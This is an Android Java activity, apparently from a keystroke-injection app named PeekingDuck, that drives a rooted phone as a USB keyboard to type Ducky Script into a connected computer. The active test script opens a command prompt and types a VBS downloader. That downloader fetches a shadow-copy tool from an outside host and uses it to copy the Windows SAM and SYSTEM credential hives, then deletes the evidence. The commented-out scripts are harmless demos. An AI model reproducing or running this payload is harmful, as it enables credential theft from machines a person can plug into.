package peekingduckapp.peekingduck;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.Arrays;

public class InterpreterActivity extends AppCompatActivity implements View.OnClickListener {
    private Button test;
    private String script_path;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_interpreter);

        script_path = getIntent().getStringExtra("script_path");

        unbundle_file();

        test = findViewById(R.id.btn_int);
        test.setOnClickListener(this);
    }

    @Override
    public void onClick(View v) {
        switch (v.getId()) {
            case R.id.btn_int:
                test_int();
                break;
        }
    }

    protected void make_toast(String txt) {
        Toast.makeText(this, txt, Toast.LENGTH_LONG).show();
    }

    protected void request_root_access() {
        try {
            final Process su = Runtime.getRuntime().exec("su");
        } catch (IOException e) {
            make_toast("Unable to gain required root access");
        }
    }

    protected void unbundle_file() {
        InputStream is = getResources().openRawResource(getResources().getIdentifier("hid_gadget_test", "raw", getPackageName()));
        boolean successful_copy = false;

        File file = new File(getFilesDir(), "hid_gadget_test");
        script_path = file.getAbsolutePath();

        // If file is not already unpacked
        if(file.exists()) file.delete();
//        if (!file.exists()) {
            try {
                OutputStream output = new FileOutputStream(file);
                byte[] buffer = new byte[4 * 1024];
                int read;
                while ((read = is.read(buffer)) != -1) {
                    output.write(buffer, 0, read);
                }
                successful_copy = true;
                output.flush();
                output.close();
                is.close();
            } catch (Exception e) {
                successful_copy = false;
            }

            if (successful_copy) {
                try {
                    Process proc = Runtime.getRuntime()
                            .exec(new String[]{"su", "-c", "chmod 755 " + script_path});
                    proc.waitFor();
                } catch (Exception e) {
                }
            }
//        }
    }

    private void test_int() {
        //request_root_access();
        String folder = "C:/Users/amg";
        ArrayList<String> script = new ArrayList<>(Arrays.asList(
                "DEFAULTDELAY 300",
                "ALT F4",
                "ESCAPE",
                "CONTROL ESCAPE",
                "DELAY 400",
                "STRING cmd",
                "DELAY 400",
                "ENTER",
                "DELAY 400",
                "STRING cd {{%folder}}",
                "ENTER",
                "DELAY 200",
                "STRING copy con download.vbs",
                "ENTER",
                "STRING Set args = WScript.Arguments:a = split(args(0), \"/\")(UBound(split(args(0),\"/\")))",
                "ENTER",
                "STRING Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\"):objXMLHTTP.open \"GET\", args(0), false:objXMLHTTP.send()",
                "ENTER",
                "STRING If objXMLHTTP.Status = 200 Then",
                "ENTER",
                "STRING Set objADOStream = CreateObject(\"ADODB.Stream\"):objADOStream.Open",
                "ENTER",
                "STRING objADOStream.Type = 1:objADOStream.Write objXMLHTTP.ResponseBody:objADOStream.Position = 0",
                "ENTER",
                "STRING Set objFSO = Createobject(\"Scripting.FileSystemObject\"):If objFSO.Fileexists(a) Then objFSO.DeleteFile a",
                "ENTER",
                "STRING objADOStream.SaveToFile a:objADOStream.Close:Set objADOStream = Nothing ",
                "ENTER",
                "STRING End if:Set objXMLHTTP = Nothing:Set objFSO = Nothing",
                "ENTER",
                "CTRL z",
                "ENTER",
                "STRING cscript download.vbs http://tools.lanmaster53.com/vssown.vbs",
                "ENTER",
                "DELAY 800",
                "STRING del download.vbs",
                "ENTER",
                "DELAY 800",
                "STRING cscript vssown.vbs /start",
                "ENTER",
                "DELAY 800",
                "STRING cscript vssown.vbs /create",
                "ENTER",
                "DELAY 800",
                "STRING copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\system32\\config\\SAM .",
                "ENTER",
                "DELAY 800",
                "STRING copy \\\\?\\\\GLoBALROOT\\Device\\HarddriskVolumeShadowCopy1\\windows\\system32\\config\\SYSTEM .",
                "ENTER",
                "DELAY 800",
                "STRING cscript vssown.vbs /stop",
                "ENTER",
                "DELAY 800",
                "STRING del vssown.vbs",
                "ENTER",
                "STRING exit",
                "ENTER",
                "REM Make sure to change the DIRECTORY above."
        ));
//        for(int i = 0; i < 1000; i++) {
//            script.add("STRING 0x" + Integer.valueOf(String.valueOf(i), 16));
//            script.add("ENTER");
//        }
//        ArrayList<String> script = new ArrayList<>(Arrays.asList(
//                "DEFAULTDELAY 1000",
//                "STRING |",
//                "REPEAT 100"
//        ));
//        ArrayList<String> script = new ArrayList<String>(Arrays.asList(
//                "DEFAULTDELAY 1000",
//                "GUI r",
//                "DELAY 400",
//                "STRING notepad.exe",
//                "ENTER",
//                "DELAY 2000",
//                "STRING Hello World",
//                "DELAY 10000",
//                "ALT f",
//                "STRING s",
//                "DELAY 400",
//                "STRING hi.txt",
//                "ENTER",
//                "REM alt-f pulls up the File menu and s saves. This two keystroke combo is why ALT is jealous of CONTROL's leetness and CTRL+S"));
//        ArrayList<String> script = new ArrayList<String>(Arrays.asList(
//                "DEFAULTDELAY 2000",
//                "GUI 4",
//                "DELAY 100",
//                "GUI d",
//                "DELAY 100",
//                "STRING gedit",
//                "DELAY 100",
//                "ENTER",
//                "DELAY 10000",
//                "STRING Hello World"));
//                ArrayList<String> script = new ArrayList<String>(Arrays.asList(
//                        "DEFAULTDELAY 1000",
//                        "GUI d",
//                        "WINDOWS",
//                        "STRING https://i.imgflip.com/1dv8ac.jpg",
//                        "ENTER",
//                        "DELAY 3000",
//                        "CTRL s",
//                        "DELAY 500",
//                        "STRING %userprofile%\\Desktop\\QUACKED",
//                        "ENTER",
//                        "REM saving the picture to the user Desktop, pic name QUACKED...",
//                        "DELAY 100",
//                        "GUI d",
//                        "REM shows desktop",
//                        "WINDOWS r",
//                        "STRING %userprofile%\\Desktop\\QUACKED.png",
//                        "ENTER",
//                        "REM opens the png file",
//                        "MENU",
//                        "ENTER",
//                        "ALT F4",
//                        "REM sets the background, and closes.",
//                        "GUI d",
//                        "MENU",
//                        "STRING v",
//                        "STRING d"));
//        ArrayList<String> script = new ArrayList<>(Arrays.asList(
//                "GUI r",
//                "DELAY 1000",
//                "STRING notepad.exe",
//                "ENTER",
//                "DELAY 1000",
//                "STRING Space:  ", "ENTER",
//                "STRING Enter: \n", "ENTER",
//                "STRING Period: .", "ENTER",
//                "STRING Exclamation Mark: !", "ENTER",
//                "STRING Backquote: `", "ENTER",
//                "STRING Tilde: ~", "ENTER",
//                "STRING Plus: +", "ENTER",
//                "STRING Equal: =", "ENTER",
//                "STRING Underscore: _", "ENTER",
//                "STRING Minus: -", "ENTER",
//                "STRING Double Quote: \"", "ENTER",
//                "STRING Single Quote: '", "ENTER",
//                "STRING Colon: :", "ENTER",
//                "STRING SemiColon: ;", "ENTER",
//                "STRING Pointy Bracket Left: <", "ENTER",
//                "STRING Pointy Bracket Right: >", "ENTER",
//                "STRING Comma: ,", "ENTER",
//                "STRING Question Mark: ?", "ENTER",
//                "STRING Backslash: \\", "ENTER",
//                "STRING Pipe: |", "ENTER",
//                "STRING Forward Slash: /", "ENTER",
//                "STRING Curly Bracket Left: {", "ENTER",
//                "STRING Curly Bracket Right: }", "ENTER",
//                "STRING Round Bracket Left: (", "ENTER",
//                "STRING Round Bracket Right: )", "ENTER",
//                "STRING Square Bracket Left: [", "ENTER",
//                "STRING Square Bracket Right: ]", "ENTER",
//                "STRING Hash: #", "ENTER",
//                "STRING Pound: £", "ENTER",
//                "STRING Dollar: $", "ENTER",
//                "STRING Percentage: %", "ENTER",
//                "STRING Up Arrow: ^", "ENTER",
//                "STRING Ampersand: &", "ENTER",
//                "STRING Star: *", "ENTER"
//                ));
        Interpreter interpreter = new Interpreter(script, script_path);
        interpreter.run();
    }
}
